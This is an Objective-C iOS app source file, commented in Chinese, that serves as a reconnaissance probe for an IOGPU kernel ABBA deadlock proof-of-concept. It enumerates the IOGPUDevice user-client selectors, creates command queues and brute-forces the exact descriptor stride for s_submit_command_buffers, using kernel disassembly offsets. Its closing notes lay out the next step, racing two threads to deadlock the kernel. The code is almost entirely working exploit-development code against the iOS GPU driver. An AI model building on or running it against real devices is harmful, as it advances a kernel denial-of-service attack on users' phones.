//
//  iogpu_probe.m — IOGPU ABBA 死锁 PoC 的前置探针（只读 / 不触发死锁）
//
//  目的（P0 第一步）：把 PoC 需要的全部运行时参数逼出来
//    1. IOGPUDevice 的 IOServiceMatching 名字 + open type
//    2. selector 面（哪些存在）
//    3. sel 7 = s_new_command_queue（sin=1032, sout=16）能否零配置建出队列 → 拿 queue id
//    4. sel 26 = s_submit_command_buffers：scalars[0]=queue_id, [2]=count, [3]=stride,
//       structureInputSize 必须 == count*stride；且 **stride 必须精确等于 [queue->0x530]->0x268**
//       → 用 count=0（structInput=NULL,size=0）扫 stride，找出那个精确值
//
//  离线依据（iogpu_a14_18.7.2 反汇编）：
//    s_submit_command_buffers @0xfffffff009bf430c
//      0x9bf43d4 ldr w8,[args+0x28]; cmp #4; b.eq     ; scalarInputCount 必须 == 4
//      0x9bf43fc ldp x24,x22,[scalarInput+0x10]       ; x24=scalar[2]=count, x22=scalar[3]=stride
//      0x9bf444c cmp structureInputSize, count*stride ; 必须相等
//      0x9bf4454 ldr w1,[scalarInput+0]               ; queue id
//      0x9bf446c ldr w8,[[queue+0x530]+0x268]; cmp x22,w8; b.ne  ; stride 必须精确相等
//      0x9bf4488 bl 0x9c1ddf0                          ; → 路径 B（458 → 528）
//    s_delete_command_queue @0xfffffff009bf3eb0    ; scalars[0] = queue id
//    s_new_command_queue    @0xfffffff009bf3b9c    ; structIn 1032B, structOut 16B {u32 id, u64 x}
//
//  安全性：全程不触发销毁链，只建/查/提交 0 个 buffer。最坏返回错误码。
//

#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <CoreFoundation/CoreFoundation.h>
#include <mach/mach.h>
#include <unistd.h>

static NSMutableString *gLog = nil;
static UITextView    *gView = nil;
static UILabel       *gStatus = nil;
static dispatch_queue_t gQ = nil;

static const char *kr_name(kern_return_t kr)
{
    switch ((uint32_t)kr) {
        case 0:          return "SUCCESS";
        case 0xe00002b0: return "NoSuchClass";
        case 0xe00002bc: return "Error";
        case 0xe00002be: return "NoResources";
        case 0xe00002c0: return "NoDevice";
        case 0xe00002c1: return "NotPrivileged";
        case 0xe00002c2: return "BadArgument";
        case 0xe00002c5: return "ExclusiveAccess";
        case 0xe00002c7: return "Unsupported";
        case 0xe00002c9: return "InternalError";
        case 0xe00002cc: return "NotOpen";
        case 0xe00002d4: return "Busy";
        case 0xe00002d8: return "NotAttached";
        case 0xe00002db: return "InitFailed(2db)";
        case 0xe00002e2: return "NotPermitted";
        case 0xe0078001: return "E007_8001";
        case 0xe00002f0: return "NotFound";
        default:         return "?";
    }
}

static void L(NSString *fmt, ...)
{
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *line = [s stringByAppendingString:@"\n"];
    NSString *p = [NSTemporaryDirectory() stringByAppendingPathComponent:@"iogpu_probe.log"];
    FILE *f = fopen([p UTF8String], "a");
    if (f) { fprintf(f, "%s", [line UTF8String]); fclose(f); }
    dispatch_async(gQ, ^{
        [gLog appendString:line];
        dispatch_async(dispatch_get_main_queue(), ^{
            if (gView) { gView.text = gLog; [gView scrollRangeToVisible:NSMakeRange(gLog.length,0)]; }
        });
    });
}

static void SetStatus(NSString *s)
{
    dispatch_async(dispatch_get_main_queue(), ^{
        if (gStatus) {
            gStatus.text = s;
            gStatus.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightBold];
        }
    });
}

static NSString *prop(io_registry_entry_t e, NSString *k)
{
    CFTypeRef v = IORegistryEntryCreateCFProperty(e, (__bridge CFStringRef)k,
                                                 kCFAllocatorDefault, 0);
    if (!v) return nil;
    NSString *s = nil;
    if (CFGetTypeID(v) == CFStringGetTypeID()) s = [NSString stringWithString:(__bridge NSString *)v];
    else s = [[NSString alloc] initWithFormat:@"%@", (__bridge id)v];
    CFRelease(v);
    return s;
}

// ---------------------------------------------------------------- 服务发现

static const char *g_cands[] = {
    "IOGPUDevice", "IOGPU", "IOAccelerator", "AGXAcceleratorG13P_B0", "AppleCLCD2"
};

static void phase1_find(void)
{
    L(@"");
    L(@"========== Phase 1: 服务发现 ==========");
    int n = (int)(sizeof(g_cands)/sizeof(g_cands[0]));
    for (int i = 0; i < n; i++) {
        L(@"");
        L(@"-- %s --", g_cands[i]);
        CFMutableDictionaryRef m = IOServiceMatching(g_cands[i]);
        if (!m) { L(@"   IOServiceMatching 返回 NULL"); continue; }
        io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, m);
        if (svc == MACH_PORT_NULL) { L(@"   未匹配"); continue; }
        L(@"   svc = 0x%x", svc);
        L(@"   IOClass        = %@", prop(svc, @"IOClass"));
        L(@"   CFBundleId     = %@", prop(svc, @"CFBundleIdentifier"));
        L(@"   IONameMatch    = %@", prop(svc, @"IONameMatch"));
        L(@"   IOMatchedAtBoot= %@", prop(svc, @"IOMatchedAtBoot"));
        L(@"   IOProviderClass= %@", prop(svc, @"IOProviderClass"));

        // 找它的 parent，有助于确认 IOGPUDevice 挂在哪
        io_registry_entry_t parent = MACH_PORT_NULL;
        if (IORegistryEntryGetParentEntry(svc, kIOServicePlane, &parent) == KERN_SUCCESS
            && parent != MACH_PORT_NULL) {
            L(@"   parent.IOClass = %@", prop(parent, @"IOClass"));
            IOObjectRelease(parent);
        }
        IOObjectRelease(svc);
    }
}

// ---------------------------------------------------------------- open

static io_connect_t g_conn = MACH_PORT_NULL;
static io_service_t   g_svc  = MACH_PORT_NULL;

static void phase2_open(const char *cls)
{
    L(@"");
    L(@"========== Phase 2: open(type) on %s ==========", cls);
    CFMutableDictionaryRef m = IOServiceMatching(cls);
    g_svc = m ? IOServiceGetMatchingService(kIOMainPortDefault, m) : MACH_PORT_NULL;
    if (g_svc == MACH_PORT_NULL) { L(@"   未匹配 service"); return; }

    for (uint32_t t = 0; t <= 3; t++) {
        io_connect_t c = MACH_PORT_NULL;
        kern_return_t kr = IOServiceOpen(g_svc, mach_task_self(), t, &c);
        L(@"   type=%u -> 0x%08x %-14s conn=0x%x", t, (uint32_t)kr, kr_name(kr), c);
        if (kr == KERN_SUCCESS && g_conn == MACH_PORT_NULL) {
            g_conn = c;
            L(@"   ★ 采用 type=%u", t);
        } else if (kr == KERN_SUCCESS) {
            IOServiceClose(c);
        }
    }
    if (g_conn == MACH_PORT_NULL) L(@"   ✗ 全部 open 失败");
}

// ---------------------------------------------------------------- selector 面

static void phase3_selectors(void)
{
    L(@"");
    L(@"========== Phase 3: scalar selector 0..31（Unsupported=不存在） ==========");
    if (g_conn == MACH_PORT_NULL) { L(@"   无 conn，跳过"); return; }

    char line[2048]; int o = 0;
    int exist[32], ne = 0;
    for (uint32_t sel = 0; sel <= 31; sel++) {
        uint64_t out[4]; memset(out, 0, sizeof(out));
        uint32_t oc = 4;
        kern_return_t r = IOConnectCallScalarMethod(g_conn, sel, NULL, 0, out, &oc);
        int isUnsup = ((uint32_t)r == 0xe00002c7);
        if (!isUnsup && ne < 32) exist[ne++] = (int)sel;
        if (o < (int)sizeof(line)-24)
            o += snprintf(line+o, sizeof(line)-o, "%u:%c ", sel,
                          (uint32_t)r == 0xe00002c7 ? '.' :
                          (uint32_t)r == 0x0 ? 'S' :
                          (uint32_t)r == 0xe00002c2 ? 'B' : 'x');
    }
    L(@"   %s", line);
    L(@"   图例 S=SUCCESS B=BadArgument x=其他 .=Unsupported");
    if (ne) {
        char b[512]; int q = 0;
        q += snprintf(b+q, sizeof(b)-q, "   存在的 scalar sel:");
        for (int i = 0; i < ne && q < 480; i++) q += snprintf(b+q, sizeof(b)-q, " %d", exist[i]);
        L(@"%s", b);
    }
}

// ---------------------------------------------------------------- sel 7 建队列

static uint32_t g_queue_id = 0;

static void phase4_new_queue(void)
{
    L(@"");
    L(@"========== Phase 4: sel 7 = s_new_command_queue（sin=1032, sout=16） ==========");
    if (g_conn == MACH_PORT_NULL) { L(@"   无 conn，跳过"); return; }

    // 表声明 sin=1032 → 分发层精确比较，必须正好 1032 字节
    size_t inSz = 1032;
    uint8_t *in = calloc(inSz, 1);
    if (!in) { L(@"   calloc 失败"); return; }

    for (int attempt = 0; attempt < 2; attempt++) {
        if (attempt == 1) {
            // 第二遍：把前 64 字节填成递增模式，看是否某些字段需要非零
            for (size_t i = 0; i < 64; i++) in[i] = (uint8_t)(i + 1);
        }
        uint8_t out[16]; memset(out, 0, sizeof(out));
        size_t os = sizeof(out);
        kern_return_t r = IOConnectCallStructMethod(g_conn, 7, in, inSz, out, &os);
        uint32_t id = *(uint32_t *)out;
        uint64_t v2 = *(uint64_t *)(out + 8);
        L(@"   [try%d] sel7 in=%zuB -> 0x%08x %-14s outSize=0x%zx id=%u v2=0x%llx",
          attempt, inSz, (uint32_t)r, kr_name(r), os, id, (unsigned long long)v2);
        if (r == KERN_SUCCESS && id != 0) {
            g_queue_id = id;
            L(@"   ★ 建出队列 id=%u", id);
            break;
        }
    }
    free(in);

    if (g_queue_id == 0) {
        L(@"   零配置未建出队列，改试 其它建队列 selector（43=s_create_io_command_queue,47=s_create_io_command_buffer）");
        // sel 43: cin=2, cout=2
        for (uint32_t sel = 43; sel <= 43; sel++) {
            uint64_t sc[2] = {0, 0};
            uint64_t out[2]; memset(out, 0, sizeof(out));
            uint32_t oc = 2;
            kern_return_t r = IOConnectCallScalarMethod(g_conn, sel, sc, 2, out, &oc);
            L(@"   sel%u scalars{0,0} -> 0x%08x %-14s out[0]=%llu out[1]=%llu",
              sel, (uint32_t)r, kr_name(r),
              (unsigned long long)out[0], (unsigned long long)out[1]);
        }
    }
}

// ---------------------------------------------------------------- sel 26 扫 stride

// 已知候选 stride（IOGPU command-buffer 描述符常见尺寸）
static const uint32_t g_stride_hints[] = {
    0x20, 0x28, 0x30, 0x38, 0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70, 0x78, 0x80,
    0x88, 0x90, 0xA0, 0xB0, 0xC0, 0x100
};

static kern_return_t try_submit(uint32_t qid, uint32_t count, uint32_t stride)
{
    uint64_t sc[4] = { qid, 0, count, stride };
    size_t os = 0;
    return IOConnectCallMethod(g_conn, 26, sc, 4, NULL, 0, NULL, &os);
}

static void phase5_stride(void)
{
    L(@"");
    L(@"========== Phase 5: sel 26 = s_submit_command_buffers，扫 [queue->0x530]->0x268 ==========");
    if (g_conn == MACH_PORT_NULL) { L(@"   无 conn，跳过"); return; }

    // 候选 queue id：先用自己建出来的，再退回 1..16（系统里 Metal 可能已建队列）
    uint32_t ids[24]; int nid = 0;
    if (g_queue_id) ids[nid++] = g_queue_id;
    for (uint32_t i = 1; i <= 16 && nid < 24; i++)
        if (i != g_queue_id) ids[nid++] = i;

    for (int ii = 0; ii < nid; ii++) {
        uint32_t qid = ids[ii];
        // 先用候选值快筛
        int found = 0; uint32_t good = 0;
        for (int k = 0; k < (int)(sizeof(g_stride_hints)/sizeof(g_stride_hints[0])); k++) {
            kern_return_t r = try_submit(qid, 0, g_stride_hints[k]);
            if ((uint32_t)r != 0xe00002c2) {
                L(@"   qid=%-3u stride=0x%03x -> 0x%08x %-14s  ★命中",
                  qid, g_stride_hints[k], (uint32_t)r, kr_name(r));
                good = g_stride_hints[k]; found = 1;
                break;
            }
        }
        if (!found) {
            // 没命中就按 4 字节步长细扫 0x10..0x200
            for (uint32_t s = 0x10; s <= 0x200; s += 4) {
                kern_return_t r = try_submit(qid, 0, s);
                if ((uint32_t)r != 0xe00002c2) {
                    L(@"   qid=%-3u stride=0x%03x -> 0x%08x %-14s  ★细扫命中",
                      qid, s, (uint32_t)r, kr_name(r));
                    good = s; found = 1;
                    break;
                }
            }
        }
        if (found) {
            L(@"   ⇒ qid=%u stride=0x%x：重复 3 次确认", qid, good);
            for (int t = 0; t < 3; t++) {
                kern_return_t r = try_submit(qid, 0, good);
                L(@"      [%d] 0x%08x %s", t, (uint32_t)r, kr_name(r));
            }
            // 顺带试 count=1（structInputSize 必须 = stride）
            uint8_t *sb = calloc(good ? good : 0x40, 1);
            if (sb && good) {
                size_t os = 0;
                uint64_t sc[4] = { qid, 0, 1, good };
                kern_return_t r = IOConnectCallMethod(g_conn, 26, sc, 4, sb, good, NULL, &os);
                L(@"      count=1 stride=0x%x structIn=%u -> 0x%08x %s",
                  good, good, (uint32_t)r, kr_name(r));
                free(sb);
            }
            return;   // 找到第一个可用队列就够了
        } else {
            L(@"   qid=%-3u 全档 BadArgument（该 id 无队列 / stride 不在 0x10..0x200）", qid);
        }
    }
    L(@"   ✗ 没有任何 (qid,stride) 通过——sel26 的挡路点需要重新定位");
}

// ---------------------------------------------------------------- sel 8 delete（只探测，不真删）

static void phase6_delete_probe(void)
{
    L(@"");
    L(@"========== Phase 6: sel 8 = s_delete_command_queue（只传不存在的 id 探测） ==========");
    if (g_conn == MACH_PORT_NULL) { L(@"   无 conn，跳过"); return; }
    uint64_t sc[1] = { 0xFFFF };   // 故意不存在的 id
    uint64_t out[1]; memset(out, 0, sizeof(out));
    uint32_t oc = 1;
    kern_return_t r = IOConnectCallScalarMethod(g_conn, 8, sc, 1, out, &oc);
    L(@"   id=0xFFFF -> 0x%08x %-14s（BadArgument=id 不存在，符合预期）",
      (uint32_t)r, kr_name(r));
}

static void run(void)
{
    L(@"===== IOGPU ABBA 前置探针 @ %@ =====", [NSDate date]);
    L(@"uid=%d pid=%d", getuid(), getpid());

    phase1_find();
    phase2_open("IOGPUDevice");
    if (g_conn == MACH_PORT_NULL) phase2_open("IOGPU");
    phase3_selectors();
    phase4_new_queue();
    phase5_stride();
    phase6_delete_probe();

    L(@"");
    L(@"===== 判读 =====");
    L(@"  · Phase2 全失败 => 服务名不对，看 Phase1 里哪个 IOClass 有 IOMatchedAtBoot");
    L(@"  · Phase4 出 id  => B 路径参数齐了（sel26 scalars{qid,0,0,stride}）");
    L(@"  · Phase5 命中    => 该 (qid,stride) 就是路径 B 的可重复入口");
    L(@"  · 下一步（单独包）：线程A 循环 sel26、线程B 触发销毁链 => ABBA");
    if (g_conn != MACH_PORT_NULL) { IOServiceClose(g_conn); g_conn = MACH_PORT_NULL; }
    if (g_svc  != MACH_PORT_NULL) { IOObjectRelease(g_svc); g_svc = MACH_PORT_NULL; }
    SetStatus(@"完成，看日志");
    L(@"===== done =====");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    if (!gLog) gLog = [NSMutableString new];
    if (!gQ) gQ = dispatch_queue_create("iogpu_probe.log", DISPATCH_QUEUE_SERIAL);

    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor blackColor];

    CGFloat h = self.window.bounds.size.height;
    gStatus = [[UILabel alloc] initWithFrame:CGRectMake(8, 52, self.window.bounds.size.width - 16, 30)];
    gStatus.textAlignment = NSTextAlignmentCenter;
    gStatus.text = @"iogpu_probe...";
    gStatus.textColor = [UIColor colorWithRed:0.3 green:1 blue:0.3 alpha:1];
    gStatus.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightBold];
    [vc.view addSubview:gStatus];

    gView = [[UITextView alloc] initWithFrame:CGRectMake(0, 84, self.window.bounds.size.width, h - 84)];
    gView.backgroundColor = [UIColor blackColor];
    gView.textColor = [UIColor greenColor];
    gView.font = [UIFont fontWithName:@"Menlo" size:7] ?: [UIFont systemFontOfSize:7];
    gView.editable = NO;
    [vc.view addSubview:gView];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        @autoreleasepool { run(); }
    });
    return YES;
}
@end

int main(int argc, char *argv[])
{
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); }
}
